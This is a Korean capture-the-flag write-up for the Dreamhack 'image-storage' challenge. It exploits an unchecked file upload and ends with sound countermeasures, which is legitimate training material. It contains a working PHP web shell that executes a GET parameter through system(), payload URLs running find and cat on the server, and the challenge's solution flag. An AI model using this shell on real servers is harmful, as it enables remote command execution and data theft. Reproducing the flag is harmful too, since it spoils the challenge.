# 📂 Case Analysis: image-storage

## 1. 문제 정보 (Challenge Info)
- **Description**: 파일 업로드 기능의 취약점을 이용하여 악의적인 PHP 스크립트(웹 셸)를 서버에 업로드하고, 이를 실행하여 서버의 제어권을 탈취하는 문제입니다.
- **Target**: 드림핵 워게임 서버 (image-storage)
- **Flag Format**: `DH{...}`

## 2. 분석 개요 (Overview)
- **Objective**: 정상적인 파일 대신 시스템 명령어를 실행할 수 있는 PHP 웹 셸 코드를 업로드한 뒤, 해당 파일의 경로로 접근하여 OS 명령어를 실행하고 플래그를 탈취함.
- **Key Concept**: **File Upload Vulnerability**, Web Shell

## 3. 분석 및 해결 단계 (Steps)

### Step 1: 취약점 분석 및 페이로드 제작 (Root Cause & Payload)
서버의 파일 업로드 로직에서 파일의 확장자나 내용을 엄격하게 검증하지 않는 취약점이 존재합니다. 이를 이용해 다음과 같은 PHP 웹 셸을 작성합니다.

**Web Shell Code (`webshell.php`)**:


`<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>`

- **원리**: 이 파일이 서버에서 실행되면, URL의 `cmd` GET 파라미터로 전달된 문자열을 `system()` 함수가 그대로 OS 명령어로 실행하고 그 결과를 화면에 출력해 줍니다.

### Step 2: 웹 셸 업로드 및 경로 확인
1. 작성한 `webshell.php` 파일을 문제의 파일 업로드 기능을 통해 서버에 업로드합니다.
2. 업로드 성공 후, 해당 파일이 서버의 어느 디렉터리에 저장되었는지(예: `/uploads/webshell.php`) 경로를 파악합니다.

### Step 3: 공격 실행 (Exploit)
업로드된 웹 셸의 URL로 접속하여 `cmd` 파라미터를 통해 명령어를 주입합니다.

**Payload 1 (flag.txt 파일 찾기)**:


`/uploads/webshell.php?cmd=find / -name flag.txt`


**Payload 2 (flag 읽기)**: 


`/uploads/webshell.php?cmd=cat /flag.txt`

1. `find` 명령어로 최상위 디렉터리(`/`)부터 탐색하여 flag.txt 파일의 정확한 경로를 찾습니다.
2. `cat` 명령어를 통해 해당 파일의 내용을 읽어옵니다.

## 4. 결과 (Result)
파일 업로드 검증 우회를 통해 웹 셸을 업로드하고, 원격 코드 실행으로 서버 내의 플래그 파일을 성공적으로 탈취하였습니다.

- **Flag**: `DH{c29f44ea17b29d8b76001f32e8997bab}`

## 5. 보안 인사이트 (Retrospective)
- **Root Cause**: 업로드되는 파일의 종류(확장자, MIME 타입, 파일 시그니처)에 대한 서버 단의 검증이 부재하거나 미흡하며, 업로드 디렉터리에서 스크립트 파일이 실행될 수 있도록 허용되어 있음.
- **Countermeasures**:
  - **White-list 기반 확장자 검증**: `jpg`, `png` 등 허용된 안전한 확장자만 업로드되도록 서버 단에서 철저히 검증.
  - **실행 권한 제거**: 파일이 업로드되는 디렉터리(예: `/uploads`)에서는 PHP 등의 서버 사이드 스크립트가 실행되지 않도록 웹 서버(Apache, Nginx 등) 설정을 변경.
  - **파일명 난독화**: 업로드된 파일의 이름을 랜덤한 문자열로 변경하여 공격자가 업로드된 파일의 직접 경로를 유추하기 어렵게 만듦.
